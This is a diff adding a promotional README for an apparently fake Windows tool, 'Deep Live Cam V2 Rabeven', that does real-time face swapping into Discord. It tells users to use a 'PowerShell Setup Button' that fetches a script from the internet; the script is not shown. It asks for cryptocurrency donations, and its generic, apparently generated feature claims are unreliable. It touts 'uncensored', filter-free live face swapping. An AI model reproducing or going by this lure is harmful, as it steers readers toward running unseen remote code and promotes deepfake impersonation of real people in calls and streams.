@@ -1,0 +1,78 @@
+🎬 Discord Local Uncensored Ai Deep Live Cam V2 Rabeven — Video Tool
+
+🛠️ PowerShell Setup Button
+
+Fuel the next update
+
+TRON:&nbsp;TQfTovW2eb4TeSKRuTGKjoRg1Wm51gkeaH | BTC:&nbsp;1PmNQkZUPnhnicziQZpcmTg7bkWo9EbFo7 | ETH:&nbsp;0x084156e3A148a76D3a800Fa87ce4f155630EFe10
+
+Discord Local Uncensored Ai Deep Live Cam V2 Rabeven turns your screen into a live canvas where motion, style, and voice meet in one continuous workflow. Feed your camera into a real-time pipeline, layer uncensored generative effects on top, and route the finished frame straight into your Discord stream without leaving your machine. Every tool sits where you'd expect it—capture, transform, preview, broadcast—so you can shape the look live rather than waiting on renders. It's built for people who think in frames and flows, not menus and setup wizards.
+
+📋 System Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Live face swap in real time — swap your face onto a webcam feed instantly, with low-latency rendering built for streaming and calls.
+- Discord-native workflow — run the tool locally and pipe the processed camera directly into Discord so you show up live with your chosen look.
+- Uncensored local AI models — all inference runs on your machine, so there are no content filters, no cloud limits, and no data leaving your setup.
+- Deep live cam V2 engine — improved tracking, sharper blending, and more stable frame-to-frame results than the first generation.
+- Rabeven tuning profile — a curated preset tuned for natural lighting, skin tones, and smooth motion in everyday conditions.
+- Source and target flexibility — point it at a single photo or a short clip to drive the swap, then reuse the same source across sessions.
+- Visual controls on the fly — adjust blend strength, smoothing, and mask edges while watching the preview, so you can dial in the look without restarting.
+- Drop-in camera output — the tool presents itself as a virtual camera, so any app that accepts a webcam can use the processed feed.
+- Workflow presets — save your favorite source, tuning, and output settings as a preset and switch between looks in one click.
+- Local-first privacy — models, sources, and settings stay on disk; nothing is uploaded, and no account is required.
+
+How it works
+
+Under the hood, Discord Local Uncensored Ai Deep Live Cam V2 Rabeven behaves less like a single tool and more like a small, synchronized studio. Visual frames flow in through a lightweight capture layer, get reshaped into a compact representation, and are passed to the local AI core, which swaps and blends features in real time while preserving motion, lighting, and grain. Because everything runs on your own machine, there is no round trip to a remote service — frames leave the camera, get processed, and come back as an output stream in a tight loop.
+
+The pipeline is organized into three cooperating lanes. The capture lane keeps timing honest, dropping duplicates and smoothing jitter so your output never stutters when the input wobbles. The inference lane does the heavy lifting — the deep live cam engine interprets faces and gestures, applies the chosen style or identity, and hands back a composed frame. The output lane packages that result for the live view, discards stale frames instead of letting them pile up, and keeps the previews snappy so the workflow feels like a mirror rather than a render queue.
+
+Control sits on top of all three lanes. Every adjustment — intensity, blend weight, source selection, smoothing strength, or the active AI profile — is a live dial, not a bake-in. Change a setting and the next frames reflect it; nothing reloads, nothing restarts. Profiles let you save a particular look and recall it instantly, so switching between a clean pass and a stylized pass is one click rather than a reconfiguration.
+
+Locality is the backbone of the design. Models, configuration, and cached assets all live on disk beside the app, and the engine prefers to keep them warm in memory between sessions so cold starts become warm resumes. Because nothing is sent outward, the tool can be honest about speed and privacy at the same time — the only latency you feel is the one your own hardware creates.
+
+Finally, the system is built to be watched. A small status surface shows capture rate, inference time, and output freshness at a glance, so when something feels off you can spot whether it is the camera, the model, or the output lane. That observability turns troubleshooting into a visual inspection rather than a guessing game, and it keeps the whole workflow transparent from the first frame to the last.
+
+Modules and Settings
+
+Camera Source Module
+This module establishes the raw input that everything downstream depends on, so the transformation chain always starts from a confirmed device rather than an assumed default.
+- Camera Device Selector picks the physical or virtual camera to capture from, and switching it changes the frames shown in the preview immediately.
+- Input Resolution Preference lets the user balance capture detail against processing load, which affects how smoothly the preview and output flow.
+- Source Confirmation Preview displays the unprocessed capture so the user can verify the correct device is active before enabling effects.
+
+Face Transformation Module
+This stage reshapes facial appearance in the incoming frames, and its output becomes the subject layer that later modules composite and route.
+- Transformation Preset chooses the target appearance style, and selecting a different preset updates the processed preview without disturbing the rest of the setup.
+- Transformation Strength adjusts how pronounced the face effect is, ranging from a subtle correction to a clearly altered look.
+- Face Tracking Sensitivity controls how readily the effect follows movement, which matters when the subject shifts position or leaves the frame briefly.
+
+Scene Replacement Module
+This module separates the subject from the surrounding environment and substitutes a new background, operating on the subject layer produced by the face stage.
+- Background Source Selection switches between available replacement scenes, and the preview reflects the composite right away.
+- Edge Blending adjusts how softly the subject meets the new background, which reduces visible cutout edges around hair and shoulders.
+- Background Fit Mode controls how the replacement scene is scaled or positioned relative to the subject, useful for matching framing expectations.
+
+Discord Output Module
+This module presents the fully processed feed as a camera source for Discord sessions, closing the chain that begins with the camera source module.
+- Output Target Selection designates where the transformed stream is presented, so the user can confirm Discord is receiving the effect pipeline rather than the raw camera.
+- Output Preview Reference keeps the processed preview visible as the authoritative view of what other participants see.
+- Enable and Bypass Toggle lets the user switch the processed feed on or off, which helps compare transformed output against the unmodified camera.
+
+Local Model Module
+Because processing runs against models stored on the user's own machine, this module governs which model each effect stage loads and how model changes propagate to the preview.
+- Model File Location points the tool at the local model files in use, keeping processing independent of hosted services.
+- Active Model Selection switches between locally available models, and the preview updates to show the new result.
+- Stage Assignment lets the user decide which model serves which effect stage, so face and scene processing can draw from different local sources.
+
+Capture Module
+This module saves the processed output rather than the original camera capture, drawing from the same composited feed that reaches Discord.
+
+…（内容已截断）
